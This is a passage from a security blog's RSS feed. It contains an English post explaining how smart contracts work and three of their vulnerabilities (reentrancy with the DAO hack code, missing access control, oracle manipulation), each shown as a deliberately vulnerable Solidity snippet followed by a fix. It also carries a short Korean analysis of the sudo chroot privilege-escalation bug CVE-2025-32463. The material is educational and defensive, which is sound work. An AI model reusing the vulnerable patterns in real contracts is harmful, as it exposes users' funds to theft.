&#xCEE8;&#xD2B8;&#xB799;&#xD2B8;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC880; &#xB354; &#xB2E4;&#xB8E8;&#xACE0; &#xC2F6;&#xC5C8;&#xB294;&#xB370; &#xBD84;&#xB7C9; &#xBB38;&#xC81C;&#xB85C; 3&#xAC00;&#xC9C0;&#xB9CC; &#xAC04;&#xB2E8;&#xD788; &#xC815;&#xB9AC;&#xD560; &#xC218;&#xBC16;&#xC5D0; &#xC5C6;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;..</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xC2E4;&#xC81C; &#xD574;&#xD0B9; &#xC0AC;&#xB840;&#xC640; &#xB2E4;&#xC591;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB354; &#xB2E4;&#xB904;&#xBCFC;&#xAE4C; &#xC0DD;&#xAC01;&#xC911;&#xC774;&#xC5D0;&#xC694;. </p><p>&#xB77C;&#xACE0; &#xB9D0;&#xD588;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C; &#xC8FC;&#xC81C;&#xAC00; &#xAF2D; &#xADF8;&#xB807;&#xAC8C; &#xB420;&#xC9C0;&#xB294; &#xC544;&#xC9C1; &#xBAA8;&#xB974;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F605; &#xAE34; &#xC5F0;&#xAD6C;&#xAE00; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;!</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html">https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html</a></p><p><a href="https://github.com/pcaversaccio/reentrancy-attacks">https://github.com/pcaversaccio/reentrancy-attacks</a></p><p><a href="https://owasp.org/www-project-smart-contract-top-10/">https://owasp.org/www-project-smart-contract-top-10/</a></p><p><a href="https://medium.com/coinmonks/10-smart-contract-vulnerabilities-with-code-examples-38562685fca2">https://medium.com/coinmonks/10-smart-contract-vulnerabilities-with-code-examples-38562685fca2</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockchain/">blockchain</category>
      
      <category domain="https://hackyboiz.github.io/tags/ethereum/">ethereum</category>
      
      <category domain="https://hackyboiz.github.io/tags/smartcontract/">smartcontract</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/13/bekim/smartcontract/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] From Paper to Code: Smart Contract [en]</title>
      <link>https://hackyboiz.github.io/2025/07/13/bekim/smartcontract/en/</link>
      <guid>https://hackyboiz.github.io/2025/07/13/bekim/smartcontract/en/</guid>
      <pubDate>Sun, 13 Jul 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;In the last post, we talked ab</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>In the last post, we talked about blockchain and consensus algorithms, diving into how decentralized systems work. This time, I want to explore one of the most exciting technologies built on top of blockchain: <strong>smart contracts</strong>.</p><p>You know how traditional contracts usually involve paperwork, signatures, and sometimes a middleman? Smart contracts change all that. They let us turn agreements into code that runs automatically when certain conditions are met&#x2014;no lawyers, no banks, no hassle.</p><p>In this post, I&#x2019;ll walk you through how smart contracts work, share some interesting use cases, and touch on a few common security issues to watch out for.</p><h2 id="What-Is-a-Smart-Contract"><a href="#What-Is-a-Smart-Contract" class="headerlink" title="What Is a Smart Contract?"></a>What Is a Smart Contract?</h2><p>A smart contract is a piece of code designed to automatically execute a contract when predetermined conditions are met. The terms of a contract can be implemented in code and designed to execute automatically on the blockchain. Because of this, smart contracts can reduce the cost of intermediaries and fulfill contracts without a third party.</p><p>The concept of smart contracts was first proposed in 1994 by Nick Szabo (who, incidentally, is often cited as one of the alleged creators of Satoshi Nakamoto), but it was only a concept, and the technical realization came later. In 2013, Vitalik Buterin, the creator of Ethereum, published a white paper on his blog <a href="https://web.archive.org/web/20131228111141/http://vbuterin.com/ethereum.html">outlining the concept of a new blockchain platform based on smart contracts</a>. The blockchain platform called Ethereum was officially launched in 2015, and smart contracts started to be used on real blockchains in earnest.</p><p><img src="/2025/07/13/bekim/smartcontract/en/image.jpg" alt></p><p>Smart contracts are currently used on a variety of blockchain platforms besides Ethereum, and most of these contracts are executed based on code written in the form of if-then conditional statements. Because blockchain is a structure where multiple participants share and validate the same information, it is considered a very suitable environment for validating and executing contract terms.</p><h3 id="How-smart-contracts-work"><a href="#How-smart-contracts-work" class="headerlink" title="How smart contracts work"></a>How smart contracts work</h3><p>Smart contracts are typically created in a programming language, and the sequence of actions is as follows.</p><p>1) <strong>Write the code</strong></p><pre><code class="hljs solidity">pragma solidity ^0.8.26;contract Coin {    // The keyword &quot;public&quot; makes variables    // accessible from other contracts    address public minter;    mapping(address =&gt; uint) public balances;    // Events allow clients to react to specific    // contract changes you declare    event Sent(address from, address to, uint amount);    // Constructor code is only run when the contract    // is created    constructor() {        minter = msg.sender;    }    // Sends an amount of newly created coins to an address    // Can only be called by the contract creator    function mint(address receiver, uint amount) public {        require(msg.sender == minter);        balances[receiver] += amount;    }    // Errors allow you to provide information about    // why an operation failed. They are returned    // to the caller of the function.    error InsufficientBalance(uint requested, uint available);    // Sends an amount of existing coins    // from any caller to an address    function send(address receiver, uint amount) public {        require(amount &lt;= balances[msg.sender], InsufficientBalance(amount, balances[msg.sender]));        balances[msg.sender] -= amount;        balances[receiver] += amount;        emit Sent(msg.sender, receiver, amount);    }}</code></pre><p>A contract written like the one above introduces several concepts</p><pre><code class="hljs solidity">address public minter;</code></pre><p>This code declares a state variable minter of type address. The address type is 160 bits in size, non-mutable, and is used to store an account or contract address. Additionally, by adding the public keyword, the compiler automatically creates a getter function to retrieve this value externally.</p><pre><code class="hljs solidity">mapping(address =&gt; uint) public balances;</code></pre><p>This code is a mapping that stores an address as a key and the amount of coins at that address as a value. It&#x2019;s also public, so we can look up balances by address externally.</p><pre><code class="hljs solidity">event Sent(address from, address to, uint amount);</code></pre><p>This event is called in the last line of the send() function. When the Sent event is fired, the listener receives the sender, recipient, and amount information so they can track the transaction.</p><pre><code class="hljs solidity">constructor() {    minter = msg.sender;}</code></pre><p>The Constructor code is only executed once when the contract is deployed. msg.sender is the address where the contract was deployed, which we store as a minter.</p><pre><code class="hljs solidity">function mint(address receiver, uint amount) public {    require(msg.sender == minter);    balances[receiver] += amount;}</code></pre><p>Mint new coins and send them to another address. <code>The require(msg.sender == minter)</code> condition here restricts only the distributor to call this function. And if the <code>balances[receiver]+amount</code> operation exceeds the maximum value of uint256, the transaction will be automatically reverted according to Solidity&#x2019;s built-in Checked Arithmetic safety.</p><pre><code class="hljs solidity">error InsufficientBalance(uint requested, uint available);</code></pre><p>Define the error messages error and revert. For example, if a user tries to send more coins than they have, the transaction is canceled with an InsufficientBalance error.</p><pre><code class="hljs solidity">function send(address receiver, uint amount) public {    require(amount &lt;= balances[msg.sender], InsufficientBalance(amount, balances[msg.sender]));    balances[msg.sender] -= amount;    balances[receiver] += amount;    emit Sent(msg.sender, receiver, amount);}</code></pre><p>You can send your own coins to another address. If the require condition is not met, the code will throw an InsufficientBalance error.</p><p>2) <strong>Compile and deploy</strong></p><p>The code you write is converted into Bytecode and Application Binary Interface (ABI) by the Solidity compiler.</p><ul><li>Bytecode is low-level code that can be executed by the Ethereum Virtual Machine (EVM) and is used to deploy the contract to the blockchain.</li><li>The ABI is the interface used to call the contract&#x2019;s functions from the outside, defining the function name and parameter format.</li></ul><p>The generated bytecode is then propagated on the blockchain network in the form of a transaction, and when this transaction contains a block, the contract is given a unique address and registered on the blockchain.</p><p><img src="/2025/07/13/bekim/smartcontract/en/image1.png" alt></p><p>3) <strong>Call a transaction</strong></p><pre><code class="hljs solidity">function send(address receiver, uint amount) public {        require(amount &lt;= balances[msg.sender], InsufficientBalance(amount, balances[msg.sender]));        balances[msg.sender] -= amount;        balances[receiver] += amount;        emit Sent(msg.sender, receiver, amount);    }</code></pre><p>A user who wants to call a specific function of a smart contract creates a transaction containing the function call information (target contract address, ABI-based function signature, gas information, etc. As shown in the example code, when a user creates a transaction to execute Coin.sol&#x2019;s send() function, the transaction is temporarily stored in the node&#x2019;s mempool and is picked up by the block producer (miner or validator) and included in the block. After the transaction enters the mempool, it is processed in the order of gas price!</p><p>&#x2192; mempool (Memory Pool): A place where transactions that have not yet been included in a block are temporarily stored.</p><p><img src="/2025/07/13/bekim/smartcontract/en/image2.png" alt></p><p>Broadcast this transaction to the blockchain network.</p><p><img src="/2025/07/13/bekim/smartcontract/en/image3.png" alt></p><p>4) <strong>Smart Contract Execution (EVM)</strong></p><p>The block producer first executes the smart contract, and other validating nodes re-run the same to verify the legitimacy of the block. When the block producer processes a transaction, it runs its functions (such as send()) through the EVM. The EVM decodes the input, maps the functions to be called, and executes the contract&#x2019;s logic, including require conditional statements, state changes, and event logging.</p><pre><code class="hljs solidity">require(amount &lt;= balances[msg.sender], InsufficientBalance(amount, balances[msg.sender]));</code></pre><p>If this condition is met, the contract is fulfilled; otherwise, an InsufficientBalance error is thrown and all changes are rolled back.</p><p>5) <strong>Gas handling</strong></p><p>EVMs also consume gas to run. This is used as an incentive for nodes (validators) to continuously run the network and to prevent excessive computation. The remaining gas is refunded according to the gasLimit set by the user and the actual consumption, and failed transactions also consume gas.</p><p>6) <strong>Storing results</strong></p><p>When a transaction execution is successful, the following results are reflected on the blockchain</p><ul><li>State changes: Internal storage changes, for example, <code>balances[msg.sender] -= amount</code>, are reflected in a <strong>state trie</strong>.</li><li>Event log: Events such as <code>emit Sent(...)</code> are written to a separate log store (receipts).</li></ul><p>These data are embedded in blocks, making them a persistent record shared by all nodes, and can be verified or queried by anyone.</p><p>This makes smart contracts much more efficient than traditional contracts, as they are automatically executed when conditions are met. They can be executed without the need for intermediaries, and they are also more reliable, as they are transparent and immutable when based on the blockchain. Thanks to these advantages, smart contracts are increasingly being used in a variety of fields</p><h2 id="Use-cases-for-smart-contracts"><a href="#Use-cases-for-smart-contracts" class="headerlink" title="Use cases for smart contracts"></a>Use cases for smart contracts</h2><p>Since smart contracts first gained traction on the Ethereum blockchain platform, they have expanded into a variety of fields.</p><p>1) <strong>DeFi (Decentralized Finance)</strong></p><p>DeFi is a decentralized financial system that enables deposits, loans, asset trading, derivatives, etc. to be conducted on the blockchain without the need for centralized financial institutions such as traditional banks and securities firms. DeFi services write all financial transaction logic in smart contracts.</p><p>For example, on DeFi platforms like Aave or Compound, users can deposit cryptocurrency and automatically earn interest, while other users can borrow against collateral.</p><p>Another example is Uniswap, which allows users to automatically exchange cryptocurrencies without the need for a centralized exchange: the transactions are carried out through a pool of pre-deposited liquidity, and the exchange logic is handled by smart contracts. Similarly, Curve is a platform that specializes in exchanging stablecoins, and the exchange process is also automated by smart contracts.</p><p>2) <strong>DAO (Decentralized Autonomous Organization)</strong></p><p>A DAO (Decentralized Autonomous Organization) is a form of organization where rules and decisions are automatically enforced by smart contracts rather than by a specific manager or operator like a traditional organization. Members participate in voting by holding DAO tokens, and if a proposed agenda meets certain conditions, the smart contract automatically executes it.</p><p>A prime example is MarkerDAO. MarkerDAO is a DAO built on the Ethereum blockchain that issues and manages DAI, a decentralized stablecoin. MarkerDAO keeps the value of DAI stable, and members vote on things like interest rate adjustments and system upgrades through smart contracts.</p><p>In this way, DAOs allow operations to be organized by code without human intervention.</p><p>3) <strong>CryptoKitties</strong></p><p>CryptoKitties is an Ethereum-based blockchain game that launched in 2017 that utilizes smart contracts to collect, breed, and trade digital cats.</p><p>In the game, cats are represented by NFTs, each with its own unique characteristics and appearance. Users can breed two cats to create a new cat, where the combination of genetic information and the outcome of the breeding is automatically determined by the smart contract. The resulting cat is registered as a new NFT, and users can sell it to other users or keep it for themselves. The game was so popular that it overloaded the Ethereum network shortly after launch.</p><p>As you can see, smart contracts are being used in a variety of fields, including finance, organizational operations, gaming, and more. While blockchain is known for being a highly secure technology, smart contracts have actually been hacked a few times. In the following, I will explain the vulnerabilities of smart contracts with real-world examples.</p><h2 id="Vulnerabilities-of-Smart-Contract"><a href="#Vulnerabilities-of-Smart-Contract" class="headerlink" title="Vulnerabilities of Smart Contract"></a>Vulnerabilities of Smart Contract</h2><h3 id="1-Reentrancy-Attack"><a href="#1-Reentrancy-Attack" class="headerlink" title="1. Reentrancy Attack"></a>1. Reentrancy Attack</h3><p>Reentrancy attack is a vulnerability that occurs when a smart contract makes a call to an external contract before updating its state. In this case, the external contract (if malicious) can re-enter the original function and perform actions such as withdrawal repeatedly based on the same state.</p><p>This vulnerability became a top security item to review after a 2016 DAO hack resulted in the theft of approximately $60 million.</p><p>Here&#x2019;s an example</p><ul><li>When a smart contract sends ETH or tokens to an external address (the smart contract), a function (fallback() or receive()) on the receiver side is automatically executed.</li><li>At this point, the code inside the function is executed, so the flow of execution goes to the external contract.</li><li>If the attacker uses this opportunity to call the original contract&#x2019;s function again, the original contract will be executed again in an uncleaned state because it has not yet finished executing the previous function.</li><li>As a result, the attacker can continue to withdraw funds before balance verification.</li></ul><p>The code below is part of splitDAO(), a function that was vulnerable to a reentry attack during the DAO hack.</p><pre><code class="hljs solidity">function splitDAO(uint _proposalID, address _newCurator) noEther onlyTokenholders returns (bool _success) {    ...// [1]    uint fundsToBeMoved = (balances[msg.sender] * p.splitData[0].splitBalance) / p.splitData[0].totalSupply;    //Since the balance is never updated the attacker can pass this modifier several times     // [2]    if (p.splitData[0].newDAO.createTokenProxy.value(fundsToBeMoved)(msg.sender) == false) throw;    ...    // Burn DAO Tokens    // Funds are transferred before the balance is updated    //[3]    Transfer(msg.sender, 0, balances[msg.sender]);    withdrawRewardFor(msg.sender); // be nice, and get his rewards    // Only now after the funds are transferred is the balance updated    totalSupply -= balances[msg.sender];    paidOut[msg.sender] = 0;    return true;}</code></pre><p>The splitDAO() function is executed when a user leaves a DAO and moves to a new DAO.</p><p>In [1], it calls <code>fundsToBeMoved</code>, which calculates the amount of ether the user will receive. At this point, the <code>balances[msg.sender]</code> used is not yet decremented.</p><p>In [2], sending the ether calls a function (<code>createTokenProxy</code>) in the external contract, which can be used by a malicious contract created by the attacker to call splitDAO() again.</p><p>The <code>balances[msg.sender]</code> will then still have the same value, allowing the same amount of funds to be withdrawn repeatedly in multiple requests.</p><p>It changes the internal state after [3], but this happens after the external call has already ended, so it&#x2019;s completely ineffective as a defense.</p><p><strong>Mitigation</strong></p><p>1) <strong>Use the Checks-Effects-Interactions pattern</strong><br>The smart contract must first change its internal state before interacting with the external contract. For this, it is important to write code in the following order: checks &#x2192; Effects &#x2192; Interaction.</p><ul><li>Checks: Validate inputs and conditions</li><li>Effects: Updating state variables</li><li>Interactions: call external contracts<br>2) <strong>Using ReentrancyGuard</strong><br>ReentrancyGuard, provided by <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">OpenZeppelin</a>, is a module that prevents re-entry attacks. By applying the <code>nonReentrant</code> modifier, you can block the same function from being called again when it is running.</li></ul><h3 id="2-Improper-Access-Control"><a href="#2-Improper-Access-Control" class="headerlink" title="2. Improper Access Control"></a>2. Improper Access Control</h3><p>An access control vulnerability is a vulnerability that occurs when a smart contract fails to adequately restrict access to certain functions or data.</p><p>This allows unauthorized users to access sensitive functions (e.g. token issuance, asset withdrawal, contract suspension, upgrades, etc.), threatening the security and integrity of the contract.</p><p>Below is a vulnerable version of a smart contract.</p><pre><code class="hljs solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Solidity_AccessControl {    mapping(address =&gt; uint256) public balances;    // Burn function with no access control    function burn(address account, uint256 amount) public {        _burn(account, amount);    }}</code></pre><p>In this example, anyone can call the burn function and reduce or destroy the balance of tokens at any address. This contract is a classic example of exposing sensitive functionality without permission validation.</p><p>The code below is a modified version that allows only the contract owner to call burn via the onlyOwner modifier.</p><pre><code class="hljs solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// Import the Ownable contract from OpenZeppelin to manage ownershipimport &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;contract Solidity_AccessControl is Ownable {    mapping(address =&gt; uint256) public balances;    // Burn function with proper access control, only accessible by the contract owner    function burn(address account, uint256 amount) public onlyOwner {        _burn(account, amount);    }}</code></pre><p><strong>Real-world example</strong></p><ul><li>The Parity Multisig Wallet hack in 2017 was attributed to the lack of access restrictions on the initialization function <code>initWallet()</code>. The attacker called the function to register himself as the owner of the wallet and stole approximately 150,000 ETH (approximately $30 million at the time).</li></ul><p><strong>Mitigation</strong></p><p>1) <strong>Use an authorization control module</strong><br>Use a proven access control framework such as OpenZeppelin&#x2019;s <a href="https://docs.openzeppelin.com/contracts/2.x/api/ownership#Ownable"><code>Ownable</code></a>, <code>AccessControl</code>, or Role-Based Access Control (RBAC).<br>2) <strong>It is important to design and implement access control mechanisms clearly and systematically within the smart contract.</strong></p><h3 id="3-Price-oracle-manipulation"><a href="#3-Price-oracle-manipulation" class="headerlink" title="3. Price oracle manipulation"></a>3. <strong>Price oracle manipulation</strong></h3><p>Smart contracts use oracles to fetch prices or other information from the outside world, especially in DeFi, where oracles are often used to fetch asset prices. If the oracle is manipulated, vulnerable, or unreliable, an attacker can inject false price information and cause the smart contract to behave incorrectly. This vulnerability can cause unauthorized withdrawals, excessive leverage, contract bankruptcy, liquidity pool depletion, and more.</p><p>The following example is sample code written to illustrate the concept.</p><pre><code class="hljs solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;// [1]interface IPriceFeed {    function getLatestPrice() external view returns (int);}contract PriceOracleManipulation {    address public owner;    IPriceFeed public priceFeed;    constructor(address _priceFeed) {        owner = msg.sender;        priceFeed = IPriceFeed(_priceFeed);    }// [2]    function borrow(uint256 amount) public {        int price = priceFeed.getLatestPrice();        require(price &gt; 0, &quot;Price must be positive&quot;);        // Vulnerability: No validation or protection against price manipulation        //[3]        uint256 collateralValue = uint256(price) * amount;        // Borrow logic based on manipulated price        // If an attacker manipulates the oracle, they could borrow more than they should    }    function repay(uint256 amount) public {        // Repayment logic    }}</code></pre><p>The getLatestPrice() function in [1] gets the latest price from an external system (oracle). If this oracle can be manipulated or is untrusted, an attacker can inject false price data into the contract.</p><p>When calling borrow() with [2], we get the current price of the asset from the oracle; the price &gt; 0 condition is simply a validation, and there is no defense against manipulated prices.</p><p>In [3], the collateral value is calculated by multiplying the received price value by amount, and if this value is overestimated, the attacker can borrow more funds than they actually have. If the attacker injected false price data, this could result in overborrowing against collateral and lead to system asset exfiltration.</p><p>Below is code that improves upon the vulnerable version of the smart contract shown earlier.</p><pre><code class="hljs solidity">// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface IPriceFeed {    function getLatestPrice() external view returns (int);}contract PriceOracleManipulation {    address public owner;    IPriceFeed public priceFeed;    // [1]    int public minPrice = 1000; // Set minimum acceptable price    int public maxPrice = 2000; // Set maximum acceptable price    constructor(address _priceFeed) {        owner = msg.sender;        priceFeed = IPriceFeed(_priceFeed);    }    function borrow(uint256 amount) public {        int price = priceFeed.getLatestPrice();        // [2]        require(price &gt; 0 &amp;&amp; price &gt;= minPrice &amp;&amp; price &lt;= maxPrice, &quot;Price manipulation detected&quot;);        uint256 collateralValue = uint256(price) * amount;        // Borrow logic based on valid price    }    function repay(uint256 amount) public {        // Repayment logic    }}</code></pre><p>[1] set a threshold variable to prevent price manipulation, and [2] added logic for price validation.</p><p><strong>Real-world example</strong></p><ul><li>In February 2023, the BonqDAO protocol suffered an oracle manipulation attack that caused $120 million in losses. The attacker artificially inflated the price of ALBT tokens through the oracle and over issued BEUR stablecoins as collateral. The attack was caused by the lack of oracle price validation.</li><li>In May 2023, Baby Doge tokens suffered approximately $137,000 worth of damage due to an oracle manipulation attack.</li></ul><p><strong>mitigation</strong></p><ul><li>Aggregating data from multiple independent oracles can reduce the risk of manipulation.</li><li>Set minimum and maximum thresholds on the price received from oracles to prevent sudden price fluctuations that could affect smart contract logic.</li><li>Introduce a time lock, whereby a delay between price updates prevents exploitation of instantaneous price fluctuations.</li><li>To ensure the authenticity of the data received from the oracle, we utilize attestation methods such as cryptographic signatures.</li></ul><p>In this article, we&#x2019;ve covered the concept of smart contracts, how they work, and some of their most common security vulnerabilities. In fact, I initially wanted to cover more vulnerabilities of smart contracts, but due to the length of this article, I had to briefly summarize only three.</p><p>Next time, I&#x2019;m thinking about covering more actual hacking cases and various vulnerabilities.</p><p>That being said, I don&#x2019;t know yet if that will be my next topic &#x1F605; Thanks for reading this long research post!</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html">https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html</a></p><p><a href="https://github.com/pcaversaccio/reentrancy-attacks">https://github.com/pcaversaccio/reentrancy-attacks</a></p><p><a href="https://owasp.org/www-project-smart-contract-top-10/">https://owasp.org/www-project-smart-contract-top-10/</a></p><p><a href="https://medium.com/coinmonks/10-smart-contract-vulnerabilities-with-code-examples-38562685fca2">https://medium.com/coinmonks/10-smart-contract-vulnerabilities-with-code-examples-38562685fca2</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockchain/">blockchain</category>
      
      <category domain="https://hackyboiz.github.io/tags/ethereum/">ethereum</category>
      
      <category domain="https://hackyboiz.github.io/tags/smartcontract/">smartcontract</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/13/bekim/smartcontract/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-32463 : sudo의 chroot를 이용한 Local Privilege Escalation</title>
      <link>https://hackyboiz.github.io/2025/07/12/poosic/cve-2025-32463/</link>
      <guid>https://hackyboiz.github.io/2025/07/12/poosic/cve-2025-32463/</guid>
      <pubDate>Sat, 12 Jul 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://zeropath.com/blog/sudo-chroot-cve-2025-3246</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://zeropath.com/blog/sudo-chroot-cve-2025-32463">https://zeropath.com/blog/sudo-chroot-cve-2025-32463</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>sudo v1.9.14 ~ v1.9.17</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-32463&#xB294; sudo&#xC758; chroot &#xC635;&#xC158;&#xC744; &#xC774;&#xC6A9;&#xD55C; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;(LPE, Local Privilege Ecalation) &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; Sudo&#xC5D0;&#xC11C; <code>-R</code>(<code>--chroot</code>) &#xC635;&#xC158; &#xC0AC;&#xC6A9; &#xC2DC; &#xACBD;&#xB85C; &#xCC98;&#xB9AC; &#xBC29;&#xC2DD; &#xAC1C;&#xC120;&#xC744; &#xC704;&#xD574; &#xCD94;&#xAC00;&#xB41C; <code>pivot.c</code> &#xCF54;&#xB4DC;&#xAC00; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xB418;&#xBA70; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// sudoers.c</span><span class="hljs-comment">/* Pivot root. */</span><span class="hljs-keyword">if</span> (runchroot != <span class="hljs-literal">NULL</span>) {<span class="hljs-keyword">if</span> (!pivot_root(runchroot, &amp;pivot_state))    <span class="hljs-keyword">goto</span> error;}ret = resolve_cmnd(ctx, cmnd_in, &amp;cmnd_out, path);... <span class="hljs-comment">/* Restore root. */</span><span class="hljs-keyword">if</span> (runchroot != <span class="hljs-literal">NULL</span>)(<span class="hljs-keyword">void</span>)unpivot_root(&amp;pivot_state);debug_return_int(ret);error:<span class="hljs-keyword">if</span> (runchroot != <span class="hljs-literal">NULL</span>)(<span class="hljs-keyword">void</span>)unpivot_root(&amp;pivot_state);  <span class="hljs-built_in">free</span>(cmnd_out);  debug_return_int(NOT_FOUND_ERROR);</code></pre><p><code>sudoers.c</code> &#xC5D0;&#xC11C; &#xCF54;&#xB4DC; &#xD750;&#xB984;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><code>pivot_root</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; chroot &#xC218;&#xD589;</li><li><code>resolve_cmnd</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBA85;&#xB839;&#xC5B4; &#xB9E4;&#xCE6D; &#xBC0F; &#xACBD;&#xB85C; &#xD0D0;&#xC0C9; &#xC218;&#xD589;</li><li><code>unpivot_root</code>&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xB798; &#xB8E8;&#xD2B8; &#xACBD;&#xB85C;&#xB85C; chroot &#xBCF5;&#xAD6C;</li></ol><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>pivot_root</code>&#xC640; <code>unpivot_root</code> &#xAC00; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC0AC;&#xC774;&#xC5D0; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. <code>resolve_cmnd</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; NSS API&#xC774; &#xD638;&#xCD9C;&#xB418;&#xBA70; <code>pivot_root</code>&#xB97C; &#xD1B5;&#xD574; &#xB8E8;&#xD2B8; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xB85C;&#xB4DC;&#xB41C; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC784;&#xC758; &#xD30C;&#xC77C;(<code>/etc/nsswitch.conf</code>)&#xC744; &#xC77D;&#xACE0; nss_database &#xAD00;&#xB828; &#xC815;&#xBCF4;&#xAC00; &#xAC31;&#xC2E0;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xAC31;&#xC2E0;&#xB41C; nss_database &#xC815;&#xBCF4;&#xB85C; sudoers policy&#xB97C; &#xD3C9;&#xAC00;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xB85C;&#xCEEC; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h3 id="Patched-Code"><a href="#Patched-Code" class="headerlink" title="Patched Code"></a>Patched Code</h3><pre><code class="hljs c">ret = resolve_cmnd(ctx, cmnd_in, &amp;cmnd_out, path, runchroot);...debug_return_int(ret);error:  <span class="hljs-built_in">free</span>(cmnd_out);  debug_return_int(NOT_FOUND_ERROR);</code></pre><p>&#xD604;&#xC7AC; sudo v1.9.17.p1 &#xC5D0;&#xC11C;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xAD00;&#xB828;&#xB41C; <code>pivot.c</code>, <code>pivot.h</code>&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xACE0; <code>resolve_cmnd</code>&#xC5D0;&#xC11C; chroot&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB3C4;&#xB85D; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xC73C;&#xBA70; &#xBCF4;&#xC548;&#xC0C1;&#xC758; &#xBCF5;&#xC7A1;&#xC131;&#xC744; &#xC774;&#xC720;&#xB85C; &#xC774;&#xD6C4; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; chroot &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xACE0; &#xBC1D;&#xD614;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html">https://bestwing.me/CVE-2025-36463_Sudo_chroot_Elevation_of_Privilege.md.html</a></li><li><a href="https://github.com/sudo-project/sudo/compare/v1.9.17...v1.9.17p1">https://github.com/sudo-project/sudo/compare/v1.9.17...v1.9.17p1</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/nss/">nss</category>
      
      <category domain="https://hackyboiz.github.io/tags/chroot/">chroot</category>
      
      <category domain="https://hackyboiz.github.io/tags/poosic/">poosic</category>
      
      <category domain="https://hackyboiz.github.io/tags/sudo/">sudo</category>
      
